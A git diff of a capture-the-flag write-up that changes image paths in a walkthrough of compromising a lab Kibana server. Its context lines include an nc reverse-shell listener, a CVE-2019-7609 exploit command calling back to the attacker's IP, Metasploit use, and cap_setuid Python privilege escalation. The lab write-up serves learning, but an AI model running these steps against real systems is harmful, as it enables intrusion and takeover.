@@ -2,7 +2,7 @@ Before you begin, always add your ip address to hosts file so as to avoid burden
 
 How to apply ?
 
-![](attachment/cf3a2e5dd2d551b8640a2d493f3ee36f.png)
+![](./images/cf3a2e5dd2d551b8640a2d493f3ee36f.png)
 
 ## Reconnaissance
  nmap payload:
@@ -10,12 +10,12 @@ How to apply ?
 
 Unusual port number:
 
-![](attachment/e8a15745496651c4b5b275912f8c037d.png)
+![](./images/e8a15745496651c4b5b275912f8c037d.png)
 
-![](attachment/c449e8ca809ba166e891781ff3d6294a.png)
+![](./images/c449e8ca809ba166e891781ff3d6294a.png)
 
 What is Kibana ?
-![](attachment/f63b01787e995edea417abe07af45384.png)
+![](./images/f63b01787e995edea417abe07af45384.png)
 
 Suspicious path:
 http://kiba.thm:5601/app/timelion#
@@ -34,7 +34,7 @@ For the exploitation phase we have two ways to compromise the target.
 
 After a couple of research process, I discovered the vulnerability itself which is **Prototype Pollusion** on **Timelion** feature of the **Kibana** - ElasticSearch supported and opensource data visualization platform.
 
-![](attachment/729ac78be8e9db4f7c4fed3c058becbc.png)
+![](./images/729ac78be8e9db4f7c4fed3c058becbc.png)
 
 
 Initial compromise:
@@ -52,7 +52,7 @@ nc -lvnp 1337
 
 
 Reverse Shell PoC:
-![](attachment/c01fde4a727b62e56d674dae6346ddbf.png)
+![](./images/c01fde4a727b62e56d674dae6346ddbf.png)
 
 
 
@@ -83,9 +83,9 @@ python2 CVE-2019-7609-kibana-rce.py -u http://10.10.163.241:5601 -host 10.11.69.
 
 However, it did not call back on my machine. After on my first shot, I got break-time and turn on hybrid mode on my system. Therefore, I am going to refresh the machine.
 
-![](attachment/d24a174170333ddd84070e2414595cc2.png)
+![](./images/d24a174170333ddd84070e2414595cc2.png)
 
-![](attachment/eaaad08b9760b6b943ea9af458e1c8cd.png)
+![](./images/eaaad08b9760b6b943ea9af458e1c8cd.png)
 
 
 Now it works ! After I restarted the machine, I was able to get my reverse shell !
@@ -97,7 +97,7 @@ Now it works ! After I restarted the machine, I was able to get my reverse shell
 
 Metasploit Framework offers only three modules for **Kibana** platform. However, first approach was suitable for me. You can reach out the related module in below.
 
-![](./attachment/c59ebbaa12eec0413d0a11bff25962e1.png)
+![](./images/c59ebbaa12eec0413d0a11bff25962e1.png)
 
 To interact with correlated module:
 
@@ -113,7 +113,7 @@ In order to show options required by the module, use the below command:
 show options
 ```
 
-![](./attachment/c53a369d6204c98af36def3009c7b52d.png)
+![](./images/c53a369d6204c98af36def3009c7b52d.png)
 
 Modifying the *RHOSTS*, *TARGETURI* and *RPORT* is enough to execute our exploit.
 
@@ -127,7 +127,7 @@ Example: set RHOSTS or set RPORT
 
 For this scenario, do not forget to modify *RHOSTS*, *LHOST* and *LPORT*.
 
-![](./attachment/a20b149b5028537d238919c11e7979b7.png)
+![](./images/a20b149b5028537d238919c11e7979b7.png)
 
 Since I forgot to give *LHOST* and *LPORT* option, I was not able to run the script appropriately.
 
@@ -153,13 +153,13 @@ chmod +x linpeas.sh
 4. Examine carefully  the linpeas output
 - I found really useful evidence to escalate our privileges
 
-![](./attachment/93756ad44bea650fa9d6eff977b07209.png)
+![](./images/privilege.PNG)
 
 - The crontab shows that the user Kiba has a cron job scheduled to run every minute. This job navigates to the directory /home/kiba/kibana/bin and runs the bash kibana command.
 
-![](./attachment/1.png)
+![](./images/1.png)
 
-![](./attachment/sudo.png)
+![](./images/sudo.png)
 
 We have a possible privilege escalation vector known as Sudo Privileges:
 
@@ -176,11 +176,11 @@ It did not work in this scenario:
 
 Furthermore, we have a binary named /home/kiba/.hackmeplease/python3, which has the capability cap_setuid+ep, which means that this Python binary can change user IDs (setuid). This is a potential privilege escalation vector since it allows the Python process to execute with elevated privileges.
 
-![](./attachment/2.PNG)
+![](./images/2.PNG)
 
 Let me pay attention on .hackmeplease :D
 
-![](./attachment/3.PNG)
+![](./images/3.PNG)
 
 
 Since we have the python3 binary and its vulnerability. In binary exploitation, we trust GFTOBins to escalate privileges:
@@ -191,7 +191,7 @@ https://gtfobins.github.io/gtfobins/python/
 - On GFTOBins, we have many binaries available to elevate our privileges. However, today, we should look for Python binary. After a deep dive attempt, I recognized that I was dealing with cap_setuid+ep capability. Therefore, using this payload to escalate my privileges will be suitable.
 
 
-![alt text](./attachment/4.PNG)
+![alt text](./images/4.PNG)
 
 ### Conclusion
 All in all, this article demonstrates how different penetration testing methodologies can be used. From reconnaissance to post-exploitation, I provided three vital pathways for you to understand the idea behind the scene. The detailed steps, ranging from mapping out unusual ports (Kibana) to exploiting vulnerability and escalating privilege show the significance of understanding each phase deeply. Following the steps, applying knowledge practically, and adapting to challenges are crucial. Always remember that careful planning and paying attention to small details, such as setting up the Metasploit console or configuring script parameters correctly, can save you much trouble during the engagement
